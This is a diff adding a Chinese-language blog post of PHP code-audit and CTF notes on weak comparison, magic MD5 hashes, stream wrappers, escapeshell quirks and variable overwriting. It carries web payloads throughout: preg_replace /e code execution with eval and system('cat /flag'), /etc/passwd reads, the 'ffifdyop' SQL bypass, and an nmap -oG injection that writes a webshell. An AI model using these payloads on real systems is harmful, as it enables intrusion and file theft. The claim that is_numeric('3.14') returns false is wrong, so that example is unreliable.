@@ -1,0 +1,715 @@
+---
+title: PHP代碼審計
+date: 2024-07-13T00:00:00.000Z
+tags:
+  - php
+  - sec
+draft: false
+images:
+  - /static/images/blog/2024/674234/Pasted%20image%2020241008025618.png
+authors:
+  - default
+---
+
+# 常見函數
+
+## 基礎函數
+
+```c
+show_source()    // 显示指定文件的源代码
+
+var_dump()    // 打印变量的详细信息，包括变量的类型和值
+
+scandir()    // 获取指定目录
+
+	scandir(/)    //获取根目录
+
+chr()    // 将 ASCII 码转换为对应的字符
+	可拼接file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))
+
+file_get_contents()    // 获取指定路径的文件的内容
+
+sizeof()    // 返回数组长度
+
+isset()    // 检查是否空，空则false
+```
+
+---
+
+## `is_numeric()`
+
+判斷是否為數字
+
+```php
+$var1 = 123;
+$var2 = "3.14";
+$var3 = "abc";
+$var4 = "123abc";
+
+echo is_numeric($var1);  // 输出：1（true）
+echo is_numeric($var2);  // 输出：0（false）
+echo is_numeric($var3);  // 输出：0（false）
+echo is_numeric($var4);  // 输出：0（false）
+
+```
+
+---
+
+## `intval()`
+
+字符串轉換成十進制整數
+
+```php
+echo intval("123");        // 输出: 123
+echo intval("+123");       // 输出: 123
+echo intval("123.45");     // 输出: 123
+echo intval("123abc");     // 输出: 123
+echo intval("abc123");     // 输出: 0
+echo intval("12.3abc45");  // 输出: 12
+```
+
+- 如果字符串以數字開頭，則為開頭的數字
+- 如果字符串以非數字開頭，則為0
+
+### PHP5 的 intval 不識別科學計數
+
+```php
+if(intval($num) < 2020 && intval($num + 1) > 2021) {}
+```
+
+payload: `?num=100e2`
+
+在PHP5中， intval 不識別科學計數，遇到 e 直接結束，`intval("100e2")` 會被識別成 100
+
+- 後續版本中，科學計數字符串轉數字時會被自動識別成相應數字
+
+```php
+echo intval(1e10); // 10000000000
+echo intval('1e10'); // 10000000000
+```
+
+### base 參數
+
+```
+int intval ( mixed $var [, int $base = 10 ] )
+```
+
+如果有第二個base參數 x，表示把第一個字符串參數看成x進制。
+
+如果 base參數 = 0，通過檢測 var 的格式來決定使用的進制：
+
+- 如果字符串包括了 "0x" (或 "0X") 的前綴，使用 16 進制 (hex)；否則，
+- 如果字符串以 "0" 開始，使用 8 進制(octal)；否則，
+- 將使用 10 進制 (decimal)。
+
+---
+
+## `eval()`
+
+將字符串作為php代碼執行
+
+- 可用assert替代
+
+1. eval()是一個語言構造器，**不能被可變函數調用**
+
+```php
+eval(eval(...)) #错误
+eval(assert(eval(...))) #正确
+
+#由于php版本问题，也不能直接用assert构造一句话，所以只能采用eval(assert(eval(...)))
+<?php assert(POST['a']) ;> #错误
+```
+
+2. **不能以變量的形式調用**
+
+```php
+echo $b($a) # $a = 'phpinfo();'
+
+$b = 'eval' # 错误，会报错
+$b = 'assert' # 正确，assert等效eval，把字符串当作php执行
+
+```
+
+---
+
+## `preg_match`
+
+- [[../../../編程語言/正則表達式]]
+
+```php
+preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] )
+```
+
+搜索 subject 中匹配 pattern 的部分， 以 replacement 進行替換。
+
+- $pattern: 要搜索的模式，可以是字符串或一個字符串數組。
+- $replacement: 用於替換的字符串或字符串數組。
+- $subject: 要搜索替換的目標字符串或字符串數組。
+
+### /e 模式
+
+**preg_replace** **/e** 模式下存在 RCE，php 7 被刪除
+
+#### 實戰
+
+注入環境：
+
+```php
+preg_replace( '/(' . $key . ')/ei', 'strtolower("\\1")', $value );
+```
+
+- key、value 是 GET 傳入的鍵值對
+- `/ei` 表示替換內容當作 php 執行
+
+payload1：
+
+```
+ ?\S*=${phpinfo()}
+```
+
+- `\S` 利用 GET 上傳的非法字符解析原理，解析成 `.`
+- `.*` 是 key，`${phpinfo()}` 是 value
+- `.*` 貪婪匹配任意字符任意次，匹配 `${phpinfo()}`
+- php 執行 `strtolower("{${phpinfo()}}")`
+- 原理如下
+
+payload2：
+
+```php
+?\S*=${eval($_POST[cmd])}
+// 再 POST 一个参数 cmd=system("cat /flag");
+
+// 或者解析一个题目给出的可以利用的函数
+// function getFlag(){
+//   	@eval($_GET['cmd']);
+// }
+?\S*=${getFlag()}&cmd=system("ls");
+
+```
+
+#### 原理
+
+```php
+var_dump(phpinfo()); // 结果：布尔 true
+
+var_dump(strtolower(phpinfo()));// 结果：字符串 '1'
+// 先执行 phpinfo 得到返回值是 1，再 strtolower("1") 返回值是 1
+
+var_dump(preg_replace('/(.*)/ie','1','{${phpinfo()}}'));// 结果：字符串'11'
+// 先解析 {${phpinfo()}}，其中 phpinfo 返回 1， 解析得 {$1}
+// var_dump(preg_replace('/(.*)/i','1','任意字符')); 返回 11
+
+var_dump(preg_replace('/(.*)/ie','strtolower("\\1")','{${phpinfo()}}'));// 结果：空字符串''
+
+var_dump(preg_replace('/(.*)/ie','strtolower("{${phpinfo()}}")','{${phpinfo()}}'));// 结果：空字符串''
+// 这里的'strtolower("{${phpinfo()}}")'执行后相当于 strtolower("{${1}}") 又相当于 strtolower("{null}") 又相当于 '' 空字符串
+```
+
+### php 正則反斜槓過濾問題
+
+`preg_match` 匹配反斜槓需要四個反斜槓：
+
+```php
+preg_match("/\\\\/", $str1)
+// preg_match("/\\/", $str1) 无效
+```
+
+- 原理：先由 php 解析器解析成`\\` ，再由正則匹配解析成`\`
+
+再看一個特殊的：
+
+```php
+preg_match("/\\|\\\\/", $str2)
+```
+
+- 這個匹配的是 `|\`
+
+先由 php 解析器解析為 `\|\\` ，再由正則解析為 `|\
+
+---
+
+# 技巧
+
+## 讀取文件新姿勢
+
+### highlight 高亮輸出
+
+highlight 高亮輸出 + glob 搜索並返回第一個元素
+
+```php
+eval("highlight_file(glob("/f*")[0]);")
+```
+
+- highlight_file 是 php 的函數
+
+### 無特殊字符的純函數讀取
+
+```bash
+# ls
+scandir(current(localeconv()))
+# localecnov() 函数返回一个包含本地数字及货币格式信息的数组。相当于Linux的ls
+# current() 返回数组中当前元素的值
+# scandir()就是列出目录中的文件和目录
+
+# 打印
+print_r();
+print_r(scandir(current(localeconv())));
+# 查看调试信息
+
+# 定位
+# array_reverse() 反转数组
+# next() 指向下一个 (第二个)
+next(array_reverse(scandir(current(localeconv()))))
+# 此处指倒数第二个数组元素
+
+# payload
+# highlight 读取文件
+highlight_file(next(array_reverse(scandir(current(localeconv())))));
+
+```
+
+---
+
+## 弱比較
+
+`==` 是PHP弱比較邏輯運算符
+
+### 整數 和 字符串 的弱比較
+
+嘗試將字符串轉換為整數，規則同 `intval()`，再比大小
+
+- 123a == 123
+- 例如，payload為123a可以繞過 is_numeric函數
+
+### 弱比較和強比較的區別
+
+```
+==  和 !=  左右两边数据类型不同时，会将他们转化成同一格式进行比较。
+
+=== 和 !== 左右两边数据类型不同时，则返回false
+```
+
+---
+
+## 科學記數法
+
+- 用於限制數字長度的題
+
+1000000000 = 1e9
+
+---
+
+## 繞過md5
+
+### 數組繞過
+
+md5無法比較數組，對於數組，md5會返回NULL，所以相等，可以繞過比較
+
+- 返回null，在強比較裡面`null=null`也為 True，所以也可以繞過強比較
+
+#### 實例
+
+```php
+<!--
+$a = $_GET['a'];
+$b = $_GET['b'];
+
+if($a != $b && md5($a) == md5($b)){
+    //flag
+-->
+```
+
+payload：
+
+```
+?a[]=1&b[]=2
+
+# md5($a) == md5($b) returns true
+```
+
+==另外，數組還可以繞過 strlen、正則，都返回 False==
+
+### 科學計數繞過
+
+- 只能繞過弱比較`==`，不能繞過`===`
+
+原理：在 php 中，當字符串以0e開頭時，會被 php 識別成==科學計數法==，結果均為0，因此在比較兩個以 `0e` 開頭的字符串時，無論後面的字符時是什麼，比較結果都為 True。
+
+- 所以關鍵在於找到md5值為0e開頭的字符串
+
+常用 MD5 值以 0e 開頭的字符串：
+
+| 字符串      | MD5 值                           |
+| ----------- | -------------------------------- |
+| QNKCDZO     | 0e830400451993494058024219903391 |
+| s878926199a | 0e545993274517709034328855841020 |
+| s155964671a | 0e342768416822451524974117254469 |
+| s214587387a | 0e342768416822451524974117254469 |
+| 0e215962017 | 0e291242476940776845150308577824 |
+
+- 最後一個很特殊，**原字符串和 md5 值都是 0e 開頭**，可以繞過 `md($a) == $a` 的情況
+- 更多： [GitHub - spaze/hashes: Magic hashes – PHP hash "collisions"](https://github.com/spaze/hashes)
+
+payload：
+
+```
+?a=QNKCDZO&b=s878926199a
+
+# md5($a) == md5($b) returns true
+```
+
+### md5 碰撞
+
+- [fastcoll](../工具/fastcoll.md)
+
+找到兩個真實的 md5 值一樣的字符串繞過對字符串 md5 的強等於條件。
+
+最終找到的兩個 md5 值一樣的字符串一般是亂碼，需要經過 urlencode 再POST給服務器。
+
+- hackbar 不能直接 post 經過 URL編碼之後的數據，必須通過 burp 發包
+- hackbar 直接輸入的是原始數據，會在發包的時候經過一次 URL 編碼，所以直接在 hackbar 輸入 URL 編碼之後的數據會再次被 URL 編碼，導致出錯
+
+收集：
+
+```
+TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak
+TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak
+```
+
+### 哈希長度拓展攻擊
+
+- 工具目錄：`/Users/jz/Code/CTF/tools/attack-scripts/logic`
+
+使用工具，攻擊者能夠根據**已知哈希值**、**原始消息長度**、結尾需要附加的**新數據**，計算出原始消息需要附加的**完整附加數據**以及**整個消息的新哈希值**。
+
+- 原理：利用填充函數將消息擴展為壓縮函數能處理的**固定長度的倍數**
+- 所以不能僅僅附加需要的數據，只能做到以所要求的數據結尾
+- ==原始消息需要附加的完整附加數據 是 包含結尾需要附加的新數據的**更長的字符串==**
+- 在原始消息的基礎上，不是僅僅附加了需要附加的新數據，是附加了一串**更長的數據**，需要附加的完整新數據最終可以做到以所要求的新數據結尾，所以整個完整的消息也是以所要求的新數據結尾
+
+#### 判斷 php 生成字符串長度
+
+```php
+$str = bin2hex(random_bytes(16)) . bin2hex(random_bytes(16)) . bin2hex(random_bytes(16));
+```
+
+- randomb_bytes 生成 16 字節
+- bin2hex 對每個字節生成兩個16進制字符 得到32個字符
+- 三個拼接得到96個字符
+
+### md5 sql
+
+題目：
+
+```sql
+select * from 'admin' where password=md5($pass,true)
+```
+
+payload：
+
+```
+ffifdyop
+```
+
+ffifdyop 這個字符串被 md5 哈希了之後會變成 276f722736c95d99e921722cf9ed621c，這個字符串前幾位剛好是 ‘ or ‘6
+
+---
+
+## php字符串解析特性
+
+1. removes initial whitespace
+2. converts some characters to underscore (including whitespace)
+
+| USER INPUT    | DECODED | PHP VARIABLE NAME |
+| ------------- | ------- | ----------------- |
+| %20foo_bar%00 | foo_bar | foo_bar           |
+| foo%20bar%00  | foo bar | foo_bar           |
+| foo%5bbar     | foo[bar | foo_bar           |
+
+### 繞過WAF
+
+可以在用戶輸入時，利用字符串解析特性輸入變形後的變量，導致php語法中可以正常檢測到（傳入的get/post）變量，同時，WAF等檢測規則（waf等不具有php字符串解析特性）無法識別到相應黑名單/block規則中的變量，形成bypass
+
+#### 實例
+
+對於一個存在檢測是否是數字的WAF，傳入變量為num，可以構造payload：`?%20num=phpinfo()`
+
+- `%20num` 在php語法中，被解析成`num`變量，進入後續的eval木馬中執行相應的注入代碼
+- `%20num` 在WAF檢測中，無法被解析成num，故對num的檢測沒有執行，發生bypass
+
+---
+
+## public、protected、private的區別
+
+public 表示全局，類內部外部子類都可以訪問；  
+**private表示私有的，只有本類內部可以使用； **
+protected表示受保護的，只有本類或子類或父類中可以訪問
+
+---
+
+## 魔術方法
+
+PHP中把以兩個下劃線 `__` 開頭的方法稱為魔術方法(Magic methods)
+
+```
+__construct() 当一个对象创建时被调用，反序列化不触发
+__destruct()  当一个对象销毁时被调用
+__toString()  当一个对象被当作一个字符串使用，比如echo输出或用 . 和字符串拼接
+__call()      当调用的方法不存在时触发
+__invoke()    当一个对象被当作函数调用时触发
+__wakeup()    反序列化时自动调用
+__get()       类中的属性私有或不存在触发
+__set()       类中的属性私有或不存在触发
+```
+
+---
+
+## 非法參數名傳參
+
+- [談一談PHP中關於非法參數名傳參問題\_arr4y非法傳參-CSDN博客](https://blog.csdn.net/mochu7777777/article/details/115050295)
+- 注意：只發送在PHP版本小於8時，當PHP版本大於等於8並不會出現以下介紹的轉換錯誤
+
+當變量名中出現 `.` 和 `空格` 時，PHP 會把它們轉換成下劃線
+
+但是，如果參數中出現中括號`[`，中括號會被轉換成下劃線`_`，接下來如果該參數名中還有`非法字符` 並不會繼續轉換成下劃線`_`，忽略後面所有錯誤。
+
+#### 實例
+
+```php
+$zj = $_REQUEST['z j.'];
+
+# 传入参数     $zj       实际变量
+# ?z j.=1     NULL      z_j_
+# ?z[j.=1     NULL      z_j.
+
+```
+
+- 當傳入 `?z j.=1` 時，雖然 `$zj` 變量仍然是空的，但是存在 ` $_REQUEST['z_j_']`
+- `$_GET` 會自動對參數調用 urldecode，所以得到的參數鍵值對的數組中的值都是字符串。
+
+---
+
+## php 偽協議
+
+偽協議是**一種特殊的協議，用於訪問不同的數據源**。
+
+它們並不是真正的網絡協議，而是一種封裝協議，使得PHP能夠以特定的方式**訪問和操作數據**。 PHP提供了多種偽協議，每種偽協議都有其特定的用途和功能。
+
+### file://
+
+一般用於訪問本地文件
+
+- 絕對路徑、相對路徑、網絡路徑
+
+```bash
+?file=file:///etc/passswd
+
+?url=/?url=file:///var/www/html/index.php # 访问index.php
+```
+
+### php://
+
+訪問各個輸入輸出流
+
+常用： `php://filter` 用於**讀取源碼**，`php://input` 用於**執行php代碼**
+
+```bash
+# base64 输出
+php://filter/read=convert.base64-encode/resource=[文件名]
+# 适用于 include 读文件
+
+# 在数据流中写入 POST 的数据
+php://input
+
+# 读取实例
+?cmd=php://filter/read=convert.base64-encode/resource=[文件名]
+```
+
+### data://
+
+數據流封裝器，以**傳遞相應格式的數據**。可以用來執行PHP代碼。一般需要用到`base64编码`傳輸。
+
+```
+?file=data://text/plain,xxxx
+?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
+```
+
+### 實例
+
+```php
+file_get_contents($text,'r')==="welcome to the zjctf"
+```
+
+- 要求從文件裡讀取字符串，與 welcome to the zjctf 相等
+
+可以用 `data://` 和 `php://` 協議，將數據流重定向到用戶可以控制的輸入流
+
+構造 payload:
+
+```bash
+?text=data://text/plain,welcome to the zjctf
+# 相当于 封装了一个虚拟的文件 内容是 welcome to the zjctf
+
+# 或者
+
+?text=php://input
+# 同时 POST数据：welcome to the zjctf
+```
+
+---
+
+## escapeshellarg 和 escapeshellcmd
+
+### escapeshellarg
+
+- [0x02 escapeshellarg為什麼沒有奏效？](https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html#0x02-escapeshellarg)
+- [淺談escapeshellarg逃逸與參數注入 \[ Mi1k7ea \]](http://www.mi1k7ea.com/2019/07/04/%E6%B5%85%E8%B0%88escapeshellarg%E4%B8%8E%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5/)
+
+escapeshellarg 會給沒有單引號的字符串加上單引號；對於有單引號的字符串，會先對單引號轉義，再以單引號為分割，對各部分的字符串加上單引號。
+
+測試功能：
+
+```php
+<?php
+    $str1 = "ls";
+    $str2 = "ls -al";
+    $str3 = "ls'zj";
+    var_dump(escapeshellarg($str1));
+    var_dump(escapeshellarg($str2));
+    var_dump(escapeshellarg($str3));
+?>
+```
+
+結果：
+
+```
+string(4) "'ls'"
+string(8) "'ls -al'"
+string(10) "'ls'\''zj'"
+```
+
+### escapeshellcmd
+
+反斜線`\` 會在以下字符之前插入：
+
+```
+ &#;`|*?~<>^()[]{}$\   \x0A   \xFF
+```
+
+- 不成對的引號也會被轉義
+- 在 Windows 平臺上，所有這些字符以及 % 和 ! 字符都會被空格代替
+
+測試：
+
+```php
+<?php
+    $str1 = "ls";
+    $str2 = "ls;";
+    $str3 = "';ls;";
+    var_dump(escapeshellcmd($str1));
+    var_dump(escapeshellcmd($str2));
+    var_dump(escapeshellcmd($str3));
+?>
+```
+
+結果：
+
+```
+string(2) "ls"
+string(4) "ls\;"
+string(8) "\'\;ls\;"
+```
+
+### 對於 arg + cmd 的參數注入
+
+測試：
+
+```php
+<?php
+	$str1 = "zj' -l ";
+	system(escapeshellcmd("ls --ignore=".escapeshellarg($str1)." /tmp"));
+	echo escapeshellcmd("ls --ignore=".escapeshellarg($str1)." /tmp");
+?>
+```
+
+- ignore 參數需要 linux 環境
+
+結果：
+![](/static/images/blog/2024/674234/Pasted%20image%2020241008025618.png)
+
+- `ls --ignore='zj'\\'' -l \' /tmp` 可化簡 `ls --ignore=zj\ -l ' /tmp`
+
+當用戶輸入包含單引號時，先用 escapeshellarg() 處理會給該單引號添加轉義符，再用 escapeshellcmd() 處理時會將該添加的轉義符再添加一個轉義符，從而導致注入內容可以從==shellarg的單引號中逃逸掉==，造成後續可以進一步利用的參數注入漏洞。
+
+- 如果是先用escapeshellcmd()函數過濾，再用escapeshellarg()函數過濾，則不存在參數注入漏洞
+
+#### 實戰： BUUCTF 2018---Online Tool
+
+```php
+<?php
+    $host = $_GET['host'];
+    $host = escapeshellarg($host);
+    $host = escapeshellcmd($host);
+    echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);
+?>
+```
+
+payload：
+
+```
+?host=2.2.2.2' <?php echo `cat /flag`;?> -oG test.php '
+```
+
+- -oG 是 nmap 的參數，表示寫入前一個參數的內容到後一個參數所指明的文件中
+- 第一個引號後和第二個引號前要留空格
+
+---
+
+## 變量覆蓋
+
+#### 例題
+
+```php
+<?php
+
+include 'flag.php';
+$yds = "dog";
+$is = "cat";
+$handsome = 'yds';
+
+foreach($_POST as $x => $y){
+    $$x = $y;
+}
+
+foreach($_GET as $x => $y){
+    $$x = $$y;
+}
+
+foreach($_GET as $x => $y){
+    if($_GET['flag'] === $x && $x !== 'flag'){
+        exit($handsome);
+    }
+}
+
+if(!isset($_GET['flag']) && !isset($_POST['flag'])){
+    exit($yds);
+}
+
+if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
+    exit($is);
+}
+
+echo "the flag is: ".$flag;
+
+?>
+```
+
+payload：
+
+```
+?is=flag&flag=flag
+```
+
+嘗試 1. 直接從 echo 輸出 2. 從 yds 輸出 都不行，被幾個 if 條件限制住了，只能從 is 輸出。
+
+---
